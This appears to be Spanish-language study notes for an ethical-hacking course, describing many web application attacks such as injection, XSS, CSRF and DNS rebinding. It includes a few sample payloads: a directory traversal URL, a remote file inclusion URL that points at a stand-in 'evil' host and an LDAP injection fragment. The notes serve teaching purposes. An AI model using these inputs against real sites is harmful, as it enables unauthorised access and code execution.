##### **Directory Traversal**
Ocurre cuando el atacante es capaz de navegar por directorios y archivos fuera del acceso normal de la aplicación. Dicho ataque expone la estructura de directorios de una aplicación y, a menudo, también la del servidor web subyacente y el sistema operativo.

Example:

**http://www.targetsite.com/../../../sitebackup.zip**

##### **Hidden Field Manipulation Attack**

==Los atacantes llevan a cabo ataques de manipulación de campos ocultos contra sitios web de comercio electrónico, ya que la mayoría de estos sitios tienen campos ocultos en sus especificaciones de precios y descuentos,== los hackers pueden manipular los precios de los productos e incluso completar transacciones con los precios alterados.

**Pass-the-Cookie Attack**

Permiten a los atacantes acceder a los servicios web de un usuario sin proporcionar ninguna identidad ni realizar autenticación multifactor.  ==Un ataque pass-the-cookie ocurre cuando los atacantes obtienen una copia (clon) de una cookie del navegador del usuario y la usan para establecer una sesión con el servidor web objetivo.==

**Same-Site Attack**

También conocidos como ataques de dominio relacionado, ocurren ==cuando un atacante apunta a un subdominio de una organización confiable e intenta redirigir a los usuarios hacia una página web controlada por el atacante.==

**SQL Injection Attacks** 

==Los ataques de inyección SQL utilizan una serie de consultas SQL maliciosas o declaraciones SQL con el fin de manipular directamente la base de datos.==

**Command Injection Attacks**

==Las fallas de inyección de comandos permiten a los atacantes pasar código malicioso a diferentes sistemas a través de aplicaciones web. Los ataques incluyen llamadas a un sistema operativo mediante llamadas al sistema, uso de programas externos mediante comandos del shell y llamadas a bases de datos backend mediante SQL. Scripts en Perl, Python y otros lenguajes se ejecutan e insertan en aplicaciones web mal diseñadas.==

1. **▪ Shell Injection** 
==Un atacante intenta crear una cadena de entrada para obtener acceso a la shell de un servidor web.Las funciones de inyección de shell incluyen:**system(), StartProcess(),==**  
**==java.lang.Runtime.exec(), System.Diagnostics.Process.Start()**,y otras API similares.==

2. **▪ HTML Embedding**

Este tipo de ataque se utiliza para desfigurar sitios web de forma virtual.  
Mediante este ataque, un atacante agrega contenido adicional basado en HTML a la aplicación web vulnerable.

3. **▪ Inyección de Archivos (File Injection):**
El atacante explota esta vulnerabilidad e inyecta código malicioso en archivos del sistema.  
Ejemplo de URL maliciosa:  
http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?

Ejemplos:

www.certifiedhacker.com/banner.gif||newpassword||1036|60|468

**File Injection Attack**

==Ocurre cuando se permite que un usuario proporcione entrada de forma dinámica al comando de inclusión (include), sin que dicha entrada sea debidamente validada antes de su procesamiento==. Cuando el usuario proporciona la entrada, la aplicación web la pasa a los comandos de “inclusión de archivos”. PHP es particularmente vulnerable a estos ataques debido al uso intensivo de "includes" en la programación PHP y las configuraciones predeterminadas del servidor.

**LDAP Injection Attacks**

==Un ataque de inyección LDAP funciona de la misma manera que un ataque de inyección SQL, pero explota los parámetros del usuario para generar una consulta LDAP. Este tipo de ataque se ejecuta sobre un protocolo de transporte de Internet como TCP.Una técnica de inyección LDAP se utiliza para aprovechar las vulnerabilidades de entrada no validadas en aplicaciones web para pasar filtros LDAP que se utilizan para buscar servicios de directorio y obtener acceso directo a las bases de datos detrás de un árbol LDAP.==

Example : certifiedhacker)(&))

**▪ Server-Side JS Injection**

Son vulnerabilidades que se manifiestan cuando una aplicación integra valores controlables por el usuario en una cadena que el intérprete de código valida dinámicamente.

**▪ Server-Side Includes Injection:**

Los atacantes lanzan ataques de inyección del lado del servidor para tomar control de aplicaciones web integradas con directivas SSI. Dicha aplicación acepta entradas remotas de los usuarios y las utiliza en la página. Los atacantes explotan esta característica y pasan directivas maliciosas SSI como entradas.

**▪ Server-Side Template Injection   ▪ Log Injection**  

**▪ HTML Injection:** Un ataque de inyección de HTML se inicia al inyectar código HTML a través de entradas de formulario vulnerables de una página web para cambiar la apariencia del sitio web o la información proporcionada a sus usuarios.

**▪ CRLF Injection**

==Los atacantes inyectan caracteres de retorno de carro (\r) y salto de línea (\n) en la entrada del usuario para engañar al servidor web, la aplicación web o al usuario, haciéndoles creer que el objeto actual ha terminado y que se ha iniciado uno nuevo.==

**Cross-Site Scripting (XSS) Attacks** 

Los ataques de Cross-Site Scripting (XSS o CSS) explotan vulnerabilidades en páginas web generadas dinámicamente, ==lo que permite a los atacantes maliciosos **inyectar scripts del lado del cliente** en páginas web que son vistas por otros usuarios. Estos ataques ocurren cuando datos de entrada no validados se incluyen en el contenido dinámico que se envía al navegador web de un usuario para su renderización.== Los atacantes inyectan JavaScript malicioso, VBScript, ActiveX, HTML o Flash para su ejecución en el sistema de la víctima, ocultándolos dentro de solicitudes legítimas.

**Watering Hole Attack** 

==En un ataque de watering hole (pozo de agua), el atacante identifica el tipo de sitios web que frecuentemente visita una empresa o individuo objetivo y prueba estos sitios para identificar posibles vulnerabilidades.== Una vez que el atacante encuentra una vulnerabilidad, inyecta un script o código malicioso en la aplicación web que puede redirigir la página web y descargar malware en la máquina de la víctima.

**Cross-Site Request Forgery (CSRF) Attack**

Conocido como ataque de un solo clic, ocurre cuando un hacker instruye al navegador de un usuario para que envíe una solicitud al sitio web vulnerable a través de una página web maliciosa. Los sitios web relacionados con finanzas suelen contener vulnerabilidades CSRF. Generalmente, los atacantes externos no pueden acceder a las intranets corporativas; por lo tanto, CSRF es uno de los métodos utilizados para ingresar a estas redes. ==En este escenario, el atacante construye un script malicioso y lo almacena en un servidor web malicioso. Cuando un usuario visita el sitio web, el script malicioso comienza a ejecutarse, y el atacante obtiene acceso al navegador del usuario.==

**Cookie/Session Poisoning**

==Un atacante puede modificar fácilmente la información de las cookies para escalar el acceso o asumir la identidad de otro usuario.== Normalmente, el objetivo de una sesión es vincular de manera única a cada individuo con la aplicación web que está accediendo

**Web Service XML Poisoning**

El envenenamiento XML es similar a un ataque de inyección SQL. Tiene una tasa de éxito más alta en un marco de servicios web. ==Los atacantes insertan código XML malicioso en solicitudes SOAP para realizar manipulaciones de nodos XML o envenenamiento de esquemas XML, lo que genera errores en la lógica de análisis XML y rompe la lógica de ejecución==

**DNS Rebinding Attack**

==El atacante controla un servidor DNS malicioso. Crea un dominio que se resuelve inicialmente en una dirección IP externa. El navegador de la víctima realiza una solicitud DNS para resolver el dominio malicioso. En lugar de devolver una IP pública fija, el servidor DNS malicioso responde con una IP interna o privada. Después de la resolución del dominio malicioso, el navegador ahora cree que está comunicándose con un recurso legítimo==.El atacante puede luego utilizar esta técnica para realizar solicitudes a servidores internos de la red de la víctima,

**Clickjacking Attack** 

==Cuando el sitio web objetivo se carga dentro de un elemento iframe que está enmascarado con un elemento de una página web que parece legítimo. El atacante lleva a cabo este ataque engañando a la víctima para que haga clic en cualquier elemento malicioso de la página web que se coloca de forma transparente sobre cualquier página web confiable.==

**▪ Cookie Snooping :** ==Los atacantes utilizan el cookie snooping en los sistemas de las víctimas para analizar los hábitos de navegación de los usuarios y vender esa información a otros atacantes o para lanzar varios ataques contra las aplicaciones web de las víctimas.==

**▪ RC4 NOMORE Attack ==:** Es un módulo de ataque contra el cifrado de flujo RC4. Este ataque explota las vulnerabilidades del algoritmo de cifrado RC4, un sistema criptográfico que ha sido ampliamente utilizado en protocolos como SSL/TLS.==

**▪ Buffer Overflow**

**▪ Business Logic Bypass Attack** ==Se dirige a una funcionalidad específica o planeada de una aplicación web en lugar de explotar vulnerabilidades tradicionales de software==. Este tipo de ataque manipula el flujo de trabajo normal de la aplicación o las reglas de negocios para lograr el objetivo.

**▪ CAPTCHA Attacks** ==Los atacantes intentan eludir o romper estos mecanismos mediante técnicas automatizadas o la utilización de servicios externos que resuelven CAPTCHA, comprometiendo así la seguridad de la aplicación.==

**JavaScript Hijacking**

==El secuestro de JavaScript, también conocido como secuestro de JSON, es una vulnerabilidad que permite a los atacantes capturar información sensible de sistemas que utilizan Objetos JavaScript (JSON) como portadores de datos==

**Cross-Site WebSocket Hijacking (CSWH)**

==Es una vulnerabilidad de seguridad web que permite a un atacante establecer una conexión WebSocket con una aplicación web vulnerable usando la identidad de una víctima. Este tipo de ataque es posible cuando el apretón de manos de WebSocket se realiza utilizando cookies HTTP sin tokens CSRF o mecanismos de seguridad adecuados.==